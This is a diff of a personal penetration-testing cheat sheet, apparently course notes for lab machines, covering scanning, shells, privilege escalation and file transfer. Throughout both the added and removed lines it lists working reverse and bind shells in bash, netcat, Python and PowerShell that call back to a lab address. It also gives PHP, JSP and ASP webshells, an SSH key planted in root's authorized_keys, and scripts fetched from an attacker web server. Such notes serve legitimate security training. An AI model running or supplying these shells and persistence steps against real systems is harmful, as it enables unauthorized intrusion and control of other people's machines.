@@ -1,4 +1,4 @@
-# GettingStarted(Complete)
+# GettingStarted (Complete)
 
 ## Basic Tools 
 > - **Connect to VPN **  sudo openvpn user.ovpn   
@@ -43,7 +43,7 @@ Metasploit Framework (MSF) contains exploits for many public vulnerabilities and
      
     
 
-## Using SHells
+## Using Shells
 netcat can be used to connect to any listening port and interact with the service running on that port.
 > - **Start a nc listener on a local port (on my computer)** nc -lvnp 1234  or   nc 10.10.10.1 1234
 > - **Send a reverse shell from the remote server** bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
@@ -56,79 +56,41 @@ netcat can be used to connect to any listening port and interact with the servic
 > - **Upgrade shell TTY (2)** ctrl+z then stty raw -echo then fg then enter twice
 > - **Create a webshell php file** echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php
 > - Apache	/var/www/html/   Nginx	/usr/local/nginx/html/   IIS	c:\inetpub\wwwroot\   XAMPP	C:\xampp\htdocs\
-> - **Execute a command on an uploaded webshell** curl http://SERVER_IP:PORT/shell.php?cmd=id
+> - **Execute a command on an uploaded webshell** curl http://SERVER_IP:PORT/shell.php?cmd=id or go to browser http://SERVER_IP:PORT/shell.php?cmd=id
+   
+
+## Privilege Escalation
+> - **Run linpeas script to enumerate remote server** ./linpeas.sh
+> - **Test if sudo** sudo -l     or   sudo -u user /bin/echo Hello World!   or    sudo su -
+> - Try find accounts via /etc/crontab     /etc/cron.d      /var/spool/cron/crontabs/root    /etc/passwd   etc.
+> - **SSH in**
+> - **Create key** ssh-keygen -f key   
+> - **apply key to user** echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys   
+> - **SSH to server** ssh root@10.10.10.10 -i key   
+   
 
 
 
-  > whatweb --no-errors 10.10.10.0/24
-  # 
-  > 
+## Transfer Files
+> - **Start local web server** python3 -m http.server 8000
+> - **Download a file on the remote server from our local machine** wget http://10.10.14.1:8000/linenum.sh
+> - **Download a file on the remote server from our local machine** curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
+> - **Transfer a file to the remote server with scp (requires SSH access)** scp linenum.sh user@remotehost:/tmp/linenum.sh
+> - **Do It via BASE64**
+> - **Convert a file to base64** base64 file -w 0     check it via md5sum shell
+> - **Convert a file from base64 back to its orig** echo f0VMR...SNIO...InmDwU | base64 -d > shell
+> - user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > file
+
+
+
+
   # install seclists = git clone https://github.com/danielmiessler/SecLists && sudo apt install seclists -y
   # Next, add a DNS Server such as 1.1.1.1 to the /etc/resolv.conf file.
   > 
 
 
-
-
-
-
-## NCAT
-# netcat can be used to connect to any listening port and interact with the service running on that port.
-> ncat ip port 
-> nc -nv ip port
-
-## NMAP
-# port scanner
-> nmap -sV -sC -p- 10.129.42.253
-> nmap -sV --open -oA nibbles_initial_scan <ip address>
-> whatweb --no-errors 10.10.10.0/24
-> nmap -sV --script=banner -p21 10.10.10.0/24
-> nmap -sC -sV -p21 10.129.42.253
-> nmap --script smb-os-discovery.nse -p445 10.10.10.40
-> nmap -A -p445 10.129.42.253
-
-> locate scripts/citrix
-> nmap --script <script name> -p<port> <host>
   
 
-
-  # on host
-  > bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
-  > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
-  > powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-## BIND Shell
-  #
-  > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
-  > python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
-> powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
-## Once in
-  > python -c 'import pty; pty.spawn("/bin/bash")'
-  
-## WEB SHELLS
-Apache	/var/www/html/   Nginx	/usr/local/nginx/html/   IIS	c:\inetpub\wwwroot\   XAMPP	C:\xampp\htdocs\
-php = <?php system($_REQUEST["cmd"]); ?>
-jsp = <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
-asp = <% eval request("cmd") %>
-  # eg = echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
-  # browser http://SERVER_IP:PORT/shell.php?cmd=id    or curl http://SERVER_IP:PORT/shell.php?cmd=id
-  
-## Privilege Escalation
-# ./linpeas.sh
-  > dpkg -l
-  > sudo -l
-  > sudo -u user /bin/echo Hello World!
-  # /etc/crontab     /etc/cron.d      /var/spool/cron/crontabs/root
-  
-  
-## Transfer Files
-  # cd /tmp
-  > python3 -m http.server 8000
-  > wget http://10.10.14.1:8000/linenum.sh
-  > curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
-  >  scp linenum.sh user@remotehost:/tmp/linenum.sh
-  # BASE64
-  > base64 file -w 0
-  > user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > file
   
 ##########################################################################################
 
